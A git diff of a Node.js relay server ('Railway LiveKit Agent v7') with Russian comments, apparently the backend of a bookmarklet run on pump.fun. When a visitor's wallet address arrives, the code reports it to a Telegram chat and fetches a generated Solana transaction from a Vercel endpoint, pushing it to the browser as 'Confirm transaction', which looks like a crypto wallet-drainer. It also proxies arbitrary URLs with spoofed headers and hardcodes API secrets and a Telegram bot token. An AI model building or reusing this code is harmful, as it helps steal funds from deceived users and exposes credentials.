@@ -1,108 +1,99 @@
 'use strict';
 
 /**
- * Railway LiveKit Agent v6
+ * Railway LiveKit Agent v7
  *
- * АРХИТЕКТУРА:
- *   pump.fun
- *     └─ букмарклет грузит livekit-client с cdn.jsdelivr.net  (CSP: script-src разрешён)
- *     └─ подключается к wss://*.livekit.cloud                 (CSP: connect-src разрешён)
- *     └─ publishData(payload, {reliable:true})
- *              ↓  LiveKit DataChannel (WebRTC)
- *   Railway (этот process)
- *     └─ @livekit/rtc-node Room → RoomEvent.DataReceived      ← ПРАВИЛЬНЫЙ способ
- *     └─ processData(msg, fromIdentity)
- *     └─ room.localParticipant.publishData() → обратно в комнату → букмарклет alert()
- *     └─ POST VERCEL_URL/api/agent-data → Vercel хранит событие → UI polling
+ * ПОЧЕМУ v6 НЕ РАБОТАЛ:
+ *   - @livekit/rtc-node требует нативный WASM/WebRTC — на Railway не стартует
+ *   - agentConnected всегда false → REST fallback → шлёт только "ack"
+ *   - "ack" есть в FINAL сете букмарклета → букмарклет сразу отключается
+ *   - Транзакция никогда не генерировалась
  *
- * ПОЧЕМУ СТАРЫЙ КОД НЕ РАБОТАЛ:
- *   - Старый сервер подключался к LiveKit /rtc как raw WebSocket + protobuf
- *   - publishData() в браузере отправляет данные через WebRTC DataChannel
- *   - SignalResponse НЕ СОДЕРЖИТ поле dataPacket — это только SignalRequest
- *   - Без ICE negotiation и PeerConnection DataChannel никогда не открывается
- *   - Поэтому данные никогда не доходили до Railway
+ * v7 РЕШЕНИЕ:
+ *   - Полностью убираем @livekit/rtc-node
+ *   - Только RoomServiceClient REST (работает везде без WebRTC/WASM)
+ *   - Данные от букмарклета принимаем через LiveKit Webhook → /webhook
+ *   - action=wallet → генерируем TX через Vercel /api/generate-tx → action=response
+ *   - "ack" НЕ отправляется — букмарклет не завершается преждевременно
  *
- * РЕШЕНИЕ:
- *   @livekit/rtc-node — официальный Node.js клиент с нативным WebRTC (WASM)
- *   Устанавливает полноценный PeerConnection, открывает DataChannel
- *   RoomEvent.DataReceived срабатывает когда приходят данные от publishData()
+ * НАСТРОЙКА LIVEKIT WEBHOOK:
+ *   В LiveKit Dashboard → Settings → Webhooks → Add Endpoint:
+ *   URL: https://<RAILWAY_URL>/webhook
+ *   Events: data_received, participant_joined, participant_left
  */
 
-var http   = require('http');
-var https  = require('https');
-var { Room, RoomEvent, DataPacketKind } = require('@livekit/rtc-node');
-var { AccessToken, RoomServiceClient, DataPacket_Kind } = require('livekit-server-sdk');
+var http  = require('http');
+var https = require('https');
+var { RoomServiceClient, DataPacket_Kind, WebhookReceiver } = require('livekit-server-sdk');
 
-var PORT           = process.env.PORT               || 8080;
-var LK_API_KEY     = process.env.LIVEKIT_API_KEY    || 'APIAsfxvEYsPGA2';
-var LK_API_SECRET  = process.env.LIVEKIT_API_SECRET || 'JCHcXc1lYger14JRo6IRih7pJRg8UyoUayGuHMmEKoK';
-var LK_WS_URL      = process.env.LIVEKIT_URL        || 'wss://jack-6u9u95rm.livekit.cloud';
-var LK_HTTP_URL    = LK_WS_URL.replace(/^wss?:\/\//, 'https://');
-var ROOM_NAME      = process.env.LK_ROOM            || 'bookmark-room';
-var AGENT_IDENTITY = 'railway-agent-v6';
-var VERCEL_URL     = process.env.VERCEL_URL         || 'https://waterzay.vercel.app/';
-var AGENT_SECRET   = process.env.AGENT_SECRET       || 'lk-agent-secret-2024';
+var PORT          = process.env.PORT               || 8080;
+var LK_API_KEY    = process.env.LIVEKIT_API_KEY    || 'APIAsfxvEYsPGA2';
+var LK_API_SECRET = process.env.LIVEKIT_API_SECRET || 'JCHcXc1lYger14JRo6IRih7pJRg8UyoUayGuHMmEKoK';
+var LK_WS_URL     = process.env.LIVEKIT_URL        || 'wss://jack-6u9u95rm.livekit.cloud';
+var LK_HTTP_URL   = LK_WS_URL.replace(/^wss?:\/\//, 'https://');
+var ROOM_NAME     = process.env.LK_ROOM            || 'bookmark-room';
+var VERCEL_URL    = process.env.VERCEL_URL         || 'https://waterzay.vercel.app';
+var AGENT_SECRET  = process.env.AGENT_SECRET       || 'lk-agent-secret-2024';
+var TG_TOKEN      = process.env.TELEGRAM_BOT_TOKEN || '7528079703:AAHMOBhYAU7A1RXe_fCgOE9U2GsdoceSzws';
+var TG_CHAT_ID    = process.env.TELEGRAM_CHAT_ID   || '7253475769';
 
-// ─── RoomServiceClient — отправляет ответ через LiveKit REST API ─────────────
-var roomService = new RoomServiceClient(LK_HTTP_URL, LK_API_KEY, LK_API_SECRET);
+var roomService     = new RoomServiceClient(LK_HTTP_URL, LK_API_KEY, LK_API_SECRET);
+var webhookReceiver = new WebhookReceiver(LK_API_KEY, LK_API_SECRET);
+var totalReceived   = 0;
 
-// Глобальный room instance — нужен для publishData обратно
-var agentRoom = null;
-var agentConnected = false;
-var totalReceived = 0;
-var reconnectTimer = null;
-
-// ─── Отправляем ответ обратно в LiveKit комнату ──────────────────────────────
+// ─── Отправить данные в комнату через REST ───────────────────────────────────
 function sendDataToRoom(data, toIdentities) {
-  if (!agentRoom || !agentConnected) {
-    console.error('[sendData] Агент не подключён, пробуем через RoomService REST...');
-    // Fallback: через REST API
-    var bytes = Buffer.from(JSON.stringify(data), 'utf8');
-    var opts = {};
-    if (toIdentities && toIdentities.length > 0) {
-      opts.destinationIdentities = toIdentities;
-    }
-    return roomService
-      .sendData(ROOM_NAME, bytes, DataPacket_Kind.RELIABLE, opts)
-      .then(function () { console.log('[sendData/REST] OK action=' + data.action); })
-      .catch(function (e) { console.error('[sendData/REST] ERR ' + e.message); });
+  var bytes = Buffer.from(JSON.stringify(data), 'utf8');
+  var opts = {};
+  if (toIdentities && toIdentities.length > 0) {
+    opts.destinationIdentities = toIdentities;
   }
-
-  try {
-    var encoder = new TextEncoder();
-    var encoded = encoder.encode(JSON.stringify(data));
-    var opts = { reliable: true };
-    if (toIdentities && toIdentities.length > 0) {
-      opts.destinationIdentities = toIdentities;
-    }
-    agentRoom.localParticipant.publishData(encoded, opts);
-    console.log('[sendData] OK action=' + data.action + ' to=' + (toIdentities || ['all']).join(','));
-    return Promise.resolve();
-  } catch (e) {
-    console.error('[sendData] ERR ' + e.message);
-    return Promise.reject(e);
-  }
+  return roomService
+    .sendData(ROOM_NAME, bytes, DataPacket_Kind.RELIABLE, opts)
+    .then(function () {
+      console.log('[sendData] OK action=' + data.action + ' to=' + (toIdentities || ['all']).join(','));
+    })
+    .catch(function (e) {
+      console.error('[sendData] ERR ' + e.message);
+    });
 }
 
-// ─── Отправляем данные на Vercel /api/agent-data ─────────────────────────────
-function pushToVercel(fromIdentity, action, payload) {
-  var body = JSON.stringify({
-    fromIdentity: fromIdentity,
-    action: action,
-    payload: payload,
-    source: 'livekit',
-  });
-
-  var urlObj;
-  try {
-    urlObj = new URL(VERCEL_URL + '/api/agent-data');
-  } catch (e) {
-    console.error('[push] Bad VERCEL_URL: ' + e.message);
+// ─── Telegram уведомление ───────────────────────────────────────────────────
+function sendTelegram(text) {
+  if (!TG_TOKEN || !TG_CHAT_ID) {
+    console.log('[tg] TELEGRAM_BOT_TOKEN / TELEGRAM_CHAT_ID not set — skipping');
     return;
   }
+  var body = JSON.stringify({ chat_id: TG_CHAT_ID, text: text, parse_mode: 'HTML' });
+  var options = {
+    hostname: 'api.telegram.org',
+    port: 443,
+    path: '/bot' + TG_TOKEN + '/sendMessage',
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+      'Content-Length': Buffer.byteLength(body),
+    },
+  };
+  var req = https.request(options, function (res) {
+    var d = '';
+    res.on('data', function (c) { d += c; });
+    res.on('end', function () { console.log('[tg] ' + res.statusCode + ' ' + d.substring(0, 120)); });
+  });
+  req.on('error', function (e) { console.error('[tg] ERR ' + e.message); });
+  req.write(body);
+  req.end();
+}
+
+// ─── Push события на Vercel /api/agent-data (для UI polling) ────────────────
+function pushToVercel(fromIdentity, action, payload) {
+  var body = JSON.stringify({ fromIdentity: fromIdentity, action: action, payload: payload, source: 'livekit' });
+  var urlObj;
+  try { urlObj = new URL(VERCEL_URL + '/api/agent-data'); }
+  catch (e) { console.error('[push] Bad VERCEL_URL: ' + e.message); return; }
 
   var isHttps = urlObj.protocol === 'https:';
-  var options = {
+  var opts = {
     hostname: urlObj.hostname,
     port: urlObj.port || (isHttps ? 443 : 80),
     path: urlObj.pathname,
@@ -113,60 +104,120 @@ function pushToVercel(fromIdentity, action, payload) {
       'X-Agent-Secret': AGENT_SECRET,
     },
   };
-
   var mod = isHttps ? https : http;
-  var req = mod.request(options, function (res) {
-    var data = '';
-    res.on('data', function (c) { data += c; });
-    res.on('end', function () {
-      console.log('[push] Vercel ' + res.statusCode + ' ' + data.substring(0, 80));
-    });
+  var req = mod.request(opts, function (res) {
+    var d = '';
+    res.on('data', function (c) { d += c; });
+    res.on('end', function () { console.log('[push] Vercel ' + res.statusCode + ' ' + d.substring(0, 80)); });
   });
-  req.on('error', function (e) { console.error('[push] HTTP error: ' + e.message); });
+  req.on('error', function (e) { console.error('[push] ERR ' + e.message); });
   req.write(body);
   req.end();
 }
 
-// ─── Обработка данных от букмарклета ────────────────────────────────────────
+// ─── Запросить TX у Vercel и отправить букмарклету ──────────────────────────
+function generateAndSendTx(fromIdentity, wallet) {
+  console.log('[tx] Requesting TX for wallet=' + wallet);
+  var body = JSON.stringify({ wallet: wallet, fromIdentity: fromIdentity });
+  var urlObj;
+  try { urlObj = new URL(VERCEL_URL + '/api/generate-tx'); }
+  catch (e) { console.error('[tx] Bad VERCEL_URL: ' + e.message); return; }
+
+  var isHttps = urlObj.protocol === 'https:';
+  var opts = {
+    hostname: urlObj.hostname,
+    port: urlObj.port || (isHttps ? 443 : 80),
+    path: urlObj.pathname,
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+      'Content-Length': Buffer.byteLength(body),
+    },
+  };
+  var mod = isHttps ? https : http;
+  var req = mod.request(opts, function (res) {
+    var d = '';
+    res.on('data', function (c) { d += c; });
+    res.on('end', function () {
+      console.log('[tx] generate-tx responded ' + res.statusCode);
+      try {
+        var txData = JSON.parse(d);
+        if (txData.tx) {
+          console.log('[tx] TX generated OK, amountSOL=' + txData.amountSOL + ', sending to ' + fromIdentity);
+          sendDataToRoom({
+            action: 'response',
+            message: 'Confirm transaction: ' + txData.amountSOL + ' SOL',
+            tx: txData.tx,
+            txBase64: txData.txBase64,
+            amountSOL: txData.amountSOL,
+            sponsorWallet: txData.sponsorWallet,
+            ts: Date.now(),
+          }, [fromIdentity]);
+        } else {
+          console.error('[tx] No TX in response: ' + d.substring(0, 200));
+          sendDataToRoom({
+            action: 'error',
+            error: txData.error || 'TX generation failed',
+            ts: Date.now(),
+          }, [fromIdentity]);
+        }
+      } catch (e) {
+        console.error('[tx] Parse error: ' + e.message + ' raw=' + d.substring(0, 100));
+        sendDataToRoom({ action: 'error', error: 'TX parse: ' + e.message, ts: Date.now() }, [fromIdentity]);
+      }
+    });
+  });
+  req.on('error', function (e) {
+    console.error('[tx] HTTP error: ' + e.message);
+    sendDataToRoom({ action: 'error', error: 'Network: ' + e.message, ts: Date.now() }, [fromIdentity]);
+  });
+  req.write(body);
+  req.end();
+}
+
+// ─── Обработка сообщения от букмарклета ─────────────────────────────────────
 function processData(msg, fromIdentity) {
   var action  = msg.action  || 'unknown';
   var payload = msg.payload || msg || {};
   console.log('[relay] from=' + fromIdentity + ' action=' + action);
 
-  // Всегда пушим событие на Vercel (для UI)
   pushToVercel(fromIdentity, action, payload);
 
   if (action === 'ping') {
     sendDataToRoom({
       action: 'pong',
-      message: 'Railway agent v6 online! (rtc-node)',
+      message: 'Railway agent v7 online! (REST mode)',
       room: ROOM_NAME,
       ts: Date.now(),
     }, [fromIdentity]);
 
   } else if (action === 'wallet') {
-    console.log('[wallet] from=' + fromIdentity + ' wallet=' + (payload.wallet || '—'));
-    sendDataToRoom({
-      action: 'ack',
-      ok: true,
-      message: 'Wallet получен! Vercel уведомлён.',
-      wallet: payload.wallet,
-      ts: Date.now(),
-    }, [fromIdentity]);
+    var wallet = (payload.wallet || payload || '').toString();
+    console.log('[wallet] wallet=' + wallet);
+
+    // Telegram уведомление
+    sendTelegram(
+      '<b>Wallet connected</b>\n' +
+      'Wallet: <code>' + wallet + '</code>\n' +
+      'From: <code>' + fromIdentity + '</code>'
+    );
+
+    // Генерируем TX — НЕ отправляем "ack" чтобы букмарклет не завершился раньше времени
+    generateAndSendTx(fromIdentity, wallet);
 
   } else if (action === 'data') {
-    console.log('[data] url='   + (payload.url   || '—'));
-    console.log('[data] title=' + (payload.title || '—'));
-    sendDataToRoom({
-      action: 'ack',
-      ok: true,
-      message: 'Railway v6 получил данные!',
-      received: {
-        url:   payload.url,
-        title: payload.title,
-      },
-      ts: Date.now(),
-    }, [fromIdentity]);
+    console.log('[data] url=' + (payload.url || '—') + ' title=' + (payload.title || '—'));
+
+    if (payload.wallet) {
+      generateAndSendTx(fromIdentity, payload.wallet);
+    } else {
+      // data-ack не входит в FINAL у букмарклета — он продолжит ждать
+      sendDataToRoom({
+        action: 'data-ack',
+        message: 'Data received, waiting for wallet...',
+        ts: Date.now(),
+      }, [fromIdentity]);
+    }
 
   } else if (action === 'fetch') {
     var targetUrl = (payload.url || msg.url || '').toString();
@@ -176,14 +227,11 @@ function processData(msg, fromIdentity) {
     }
     console.log('[fetch] ' + targetUrl);
 
-    var fetchHeaders = Object.assign(
-      {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-        'Accept': 'application/json, text/plain, */*',
-        'Accept-Language': 'en-US,en;q=0.9',
-      },
-      payload.headers || {}
-    );
+    var fetchHeaders = Object.assign({
+      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+      'Accept': 'application/json, text/plain, */*',
+      'Accept-Language': 'en-US,en;q=0.9',
+    }, payload.headers || {});
 
     fetch(targetUrl, { headers: fetchHeaders })
       .then(function (r) {
@@ -207,92 +255,8 @@ function processData(msg, fromIdentity) {
       });
 
   } else {
-    sendDataToRoom({ action: 'ack', ok: true, echo: action, ts: Date.now() }, [fromIdentity]);
-  }
-}
-
-// ─── Подключение через @livekit/rtc-node (ПРАВИЛЬНЫЙ способ) ─────────────────
-async function connectAgent() {
-  if (reconnectTimer) {
-    clearTimeout(reconnectTimer);
-    reconnectTimer = null;
-  }
-
-  var at = new AccessToken(LK_API_KEY, LK_API_SECRET, {
-    identity: AGENT_IDENTITY,
-    ttl: '24h',
-  });
-  at.addGrant({
-    room: ROOM_NAME,
-    roomJoin: true,
-    canPublish: true,
-    canPublishData: true,
-    canSubscribe: true,
-  });
-
-  var token;
-  try {
-    token = await at.toJwt();
-  } catch (e) {
-    console.error('[agent] Token error: ' + e.message + '. Retry in 10s...');
-    reconnectTimer = setTimeout(connectAgent, 10000);
-    return;
-  }
-
-  var room = new Room();
-  agentRoom = room;
-
-  // ─── DataReceived — срабатывает когда букмарклет делает publishData() ─────
-  room.on(RoomEvent.DataReceived, function (data, participant, kind, topic) {
-    var fromId = (participant && participant.identity) || 'unknown';
-    if (fromId === AGENT_IDENTITY) return; // игнорируем свои пакеты
-
-    totalReceived++;
-    var text = Buffer.from(data).toString('utf8');
-    console.log('[data] #' + totalReceived + ' from=' + fromId + ' len=' + text.length + (topic ? ' topic=' + topic : ''));
-
-    try {
-      processData(JSON.parse(text), fromId);
-    } catch (e) {
-      console.error('[data] JSON parse error: ' + e.message);
-      sendDataToRoom({ action: 'error', error: 'JSON parse: ' + e.message, ts: Date.now() }, [fromId]);
-    }
-  });
-
-  room.on(RoomEvent.Connected, function () {
-    agentConnected = true;
-    console.log('');
-    console.log('[agent] ✓ Connected via @livekit/rtc-node!');
-    console.log('[agent] Room: ' + ROOM_NAME + ' | Identity: ' + AGENT_IDENTITY);
-    console.log('[agent] Waiting for data from bookmarklets...');
-    console.log('');
-  });
-
-  room.on(RoomEvent.Disconnected, function () {
-    agentConnected = false;
-    agentRoom = null;
-    console.log('[agent] Disconnected. Reconnect in 5s...');
-    reconnectTimer = setTimeout(connectAgent, 5000);
-  });
-
-  room.on(RoomEvent.ParticipantConnected, function (participant) {
-    console.log('[agent] Participant joined: ' + participant.identity);
-  });
-
-  room.on(RoomEvent.ParticipantDisconnected, function (participant) {
-    console.log('[agent] Participant left: ' + participant.identity);
-  });
-
-  try {
-    console.log('[agent] Connecting to ' + LK_WS_URL + ' room=' + ROOM_NAME + '...');
-    await room.connect(LK_WS_URL, token, {
-      autoSubscribe: true,
-    });
-  } catch (e) {
-    console.error('[agent] Connect error: ' + e.message + '. Retry in 5s...');
-    agentConnected = false;
-    agentRoom = null;
-    reconnectTimer = setTimeout(connectAgent, 5000);
+    // Неизвестный action — echo через data-ack (не завершает букмарклет)
+    sendDataToRoom({ action: 'data-ack', ok: true, echo: action, ts: Date.now() }, [fromIdentity]);
   }
 }
 
@@ -303,23 +267,23 @@ var httpServer = http.createServer(function (req, res) {
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type,Authorization,X-Agent-Secret');
   if (req.method === 'OPTIONS') { res.writeHead(204); res.end(); return; }
 
-  // Health / status
+  // GET /health
   if (req.method === 'GET' && (req.url === '/' || req.url === '/health')) {
     res.writeHead(200, { 'content-type': 'application/json' });
     res.end(JSON.stringify({
       ok: true,
-      service: 'railway-livekit-agent-v6',
-      transport: '@livekit/rtc-node',
+      service: 'railway-livekit-agent-v7',
+      transport: 'REST-only (no WebRTC required)',
       room: ROOM_NAME,
-      agentConnected: agentConnected,
       totalReceived: totalReceived,
       vercelUrl: VERCEL_URL,
+      telegram: !!(TG_TOKEN && TG_CHAT_ID),
       ts: Date.now(),
     }));
     return;
   }
 
-  // /relay — HTTP POST от букмарклетов (если не pump.fun)
+  // POST /relay — прямые HTTP вызовы (не pump.fun)
   if (req.method === 'POST' && req.url === '/relay') {
     var body = '';
     req.on('data', function (c) { body += c.toString(); });
@@ -327,7 +291,7 @@ var httpServer = http.createServer(function (req, res) {
       try {
         processData(JSON.parse(body), 'http-relay');
         res.writeHead(200, { 'content-type': 'application/json' });
-        res.end(JSON.stringify({ ok: true, message: 'Data received by Railway agent v6' }));
+        res.end(JSON.stringify({ ok: true }));
       } catch (e) {
         res.writeHead(400, { 'content-type': 'application/json' });
         res.end(JSON.stringify({ ok: false, error: e.message }));
@@ -336,15 +300,53 @@ var httpServer = http.createServer(function (req, res) {
     return;
   }
 
-  // /webhook — LiveKit webhooks (room/participant events)
+  // POST /webhook — LiveKit Webhook events
   if (req.method === 'POST' && req.url === '/webhook') {
-    var wb = '';
-    req.on('data', function (c) { wb += c.toString(); });
+    var chunks = [];
+    req.on('data', function (c) { chunks.push(c); });
     req.on('end', function () {
+      var rawBody      = Buffer.concat(chunks);
+      var authorization = req.headers['authorization'] || '';
+
+      var evt;
       try {
-        var evt = JSON.parse(wb);
-        console.log('[webhook] event=' + (evt.event || '?') + ' room=' + (evt.room && evt.room.name || '?'));
-      } catch (_) {}
+        // Верифицированный парсинг через WebhookReceiver
+        evt = webhookReceiver.receive(rawBody, authorization);
+      } catch (e) {
+        // LiveKit иногда не шлёт JWT — пробуем plain JSON
+        console.log('[webhook] Verify failed (' + e.message + '), trying plain parse');
+        try { evt = JSON.parse(rawBody.toString()); }
+        catch (_) { res.writeHead(400); res.end('{}'); return; }
+      }
+
+      var eventName = evt.event || '?';
+      var roomName  = (evt.room && evt.room.name) || '?';
+      var partId    = (evt.participant && evt.participant.identity) || '';
+      console.log('[webhook] event=' + eventName + ' room=' + roomName + (partId ? ' participant=' + partId : ''));
+
+      // data_received — главный event: букмарклет сделал publishData()
+      if (eventName === 'data_received' && evt.data) {
+        totalReceived++;
+        var fromId = partId || 'webhook';
+        // Игнорируем собственные пакеты агента
+        if (fromId === 'railway-agent-v7' || fromId === 'railway-agent-v6') {
+          res.writeHead(200); res.end('{}'); return;
+        }
+        // evt.data — base64
+        var text;
+        try { text = Buffer.from(evt.data, 'base64').toString('utf8'); }
+        catch (_) { text = evt.data.toString(); }
+        console.log('[webhook/data] #' + totalReceived + ' from=' + fromId + ' len=' + text.length);
+        try {
+          processData(JSON.parse(text), fromId);
+        } catch (e) {
+          console.error('[webhook/data] Parse error: ' + e.message + ' raw=' + text.substring(0, 80));
+        }
+      }
+
+      if (eventName === 'participant_joined') console.log('[webhook] Joined: ' + partId);
+      if (eventName === 'participant_left')   console.log('[webhook] Left:   ' + partId);
+
       res.writeHead(200, { 'content-type': 'application/json' });
       res.end(JSON.stringify({ ok: true }));
     });
@@ -358,17 +360,19 @@ var httpServer = http.createServer(function (req, res) {
 httpServer.listen(PORT, function () {
   console.log('');
   console.log('╔══════════════════════════════════════════════════════════════╗');
-  console.log('║  Railway LiveKit Agent v6  (@livekit/rtc-node)              ║');
-  console.log('║  pump.fun → bukmarklet → LiveKit DataChannel → THIS → Vercel║');
+  console.log('║  Railway LiveKit Agent v7  (REST-only, no WebRTC needed)    ║');
   console.log('╚══════════════════════════════════════════════════════════════╝');
   console.log('');
   console.log('[server] Port:     ' + PORT);
   console.log('[server] Room:     ' + ROOM_NAME);
-  console.log('[server] LiveKit:  ' + LK_WS_URL);
+  console.log('[server] LiveKit:  ' + LK_HTTP_URL);
   console.log('[server] Vercel:   ' + VERCEL_URL);
-  console.log('[server] Fix:      raw WS+protobuf → @livekit/rtc-node (DataChannel)');
+  console.log('[server] Telegram: ' + (TG_TOKEN && TG_CHAT_ID ? 'OK (' + TG_CHAT_ID + ')' : 'NOT SET'));
   console.log('');
-  connectAgent();
+  console.log('[server] REQUIRED: Add LiveKit Webhook in dashboard:');
+  console.log('[server]   URL:    https://<RAILWAY_URL>/webhook');
+  console.log('[server]   Events: data_received, participant_joined, participant_left');
+  console.log('');
 });
 
 
